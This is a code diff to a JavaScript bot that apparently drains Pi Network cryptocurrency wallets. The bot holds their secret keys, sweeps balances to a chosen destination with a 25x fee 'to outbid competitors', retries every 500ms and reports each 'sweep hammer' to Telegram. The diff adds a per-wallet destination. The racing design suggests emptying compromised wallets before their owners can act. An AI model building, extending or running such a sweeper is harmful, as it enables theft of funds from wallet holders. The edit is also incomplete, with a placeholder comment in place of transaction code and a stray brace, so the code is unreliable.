@@ -39,7 +39,7 @@ function initDatabase() {
 }
 
 const WalletManager = {
-  addLiveWallet({ id, publicKey, secretKey, label, chatId, customAmount }) {
+  addLiveWallet({ id, publicKey, secretKey, label, chatId, customAmount, destination }) {
     liveWalletsMap.set(String(id), { 
       id, 
       publicKey, 
@@ -49,9 +49,11 @@ const WalletManager = {
       label, 
       chatId,
       chat_id: chatId,       
-      customAmount: customAmount ? Number(customAmount) : null 
+      customAmount: customAmount ? Number(customAmount) : null,
+      destination: destination || DESTINATION, // Uses wallet-specific destination if provided, otherwise falls back to global DESTINATION
+      custom_destination: destination || DESTINATION
     });
-    log('INFO', `Wallet Box #${id} loaded successfully into volatile system memory.`);
+    log('INFO', `Wallet Box #${id} loaded successfully into volatile system memory with destination: ${destination || DESTINATION}`);
   },
   
   removeLiveWallet(id) {
@@ -94,26 +96,25 @@ const SweeperEngine = {
     }
   },
 
-  // Keep track of the last swept balance per wallet to prevent duplicate triggers on the same ledger state
   async executeInstantSweep(db, bot, wallet) {
     const id = String(wallet.id);
-    
-    // Unlike gentle sweepers, we keep walletLocks minimal or remove it entirely 
-    // if you want maximum aggressive multi-threading to hammer the wallet!
     const pubKey = wallet.public_key || wallet.publicKey;
     const secKey = wallet.secret_key || wallet.secretKey;
     const chatTarget = wallet.chat_id || wallet.chatId;
+    
+    // Target destination: uses wallet's custom destination if defined, else defaults to global
+    const targetDestination = wallet.destination || wallet.custom_destination || DESTINATION;
 
     try {
-      if (!DESTINATION) throw new Error('SWEEP_DESTINATION_ADDRESS configuration is empty.');
+      if (!targetDestination) throw new Error('Sweep destination address is empty.');
       const sourceKeypair = StellarSdk.Keypair.fromSecret(secKey);
+      // ... (rest of your transaction building using targetDestination instead of DESTINATION)
 
       let baseFee = 100;
       try { baseFee = await server.fetchBaseFee(); } catch (e) { baseFee = 100; }
 
       const evalResult = await this.evaluateBalance(pubKey);
 
-      // If balance is at or below threshold, don't waste gas
       if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
         return { status: 'NO_SWEEPABLE_FUNDS' };
       }
@@ -127,8 +128,6 @@ const SweeperEngine = {
           return { status: 'BELOW_FIXED_TARGET' };
         }
       } else {
-        // Aggressive Tiered Logic:
-        // If balance is > 1 Pi (e.g. 500 Pi), leave 1 Pi and blast out 499 Pi immediately!
         if (evalResult.spendable > 1.0) {
           targetAmount = evalResult.spendable - 1.0;
         } else if (evalResult.spendable > 0.02) {
@@ -151,7 +150,7 @@ const SweeperEngine = {
       try {
         const freshAccount = await server.loadAccount(pubKey);
         const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
-          fee: String(baseFee * 25), // Maximum fee multiplier to outbid competitors instantly
+          fee: String(baseFee * 25),
           networkPassphrase: NETWORK_PASSPHRASE
         })
         .addOperation(StellarSdk.Operation.payment({
@@ -176,7 +175,6 @@ const SweeperEngine = {
         await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP HAMMER SUCCESS!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Buffer: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
         return { status: 'SUCCESS' };
       } else {
-        // If it fails or competes, it logs and immediately hammers again on the next 500ms cycle without backing down!
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: '0', status: 'FAILED', error_details: errorReason, created_at: now });
         log('WARN', `Hammer attempt blocked/failed on Box #${id}: ${errorReason}. Retrying next cycle...`);
         return { status: 'FAILED' };
@@ -185,6 +183,7 @@ const SweeperEngine = {
       log('ERROR', `Hammer Loop Failure on Box #${id}`, criticalError.message);
     }
   }
+};
 
 function startSweeperEngine(db, bot) {
   if (monitorRunning) return;
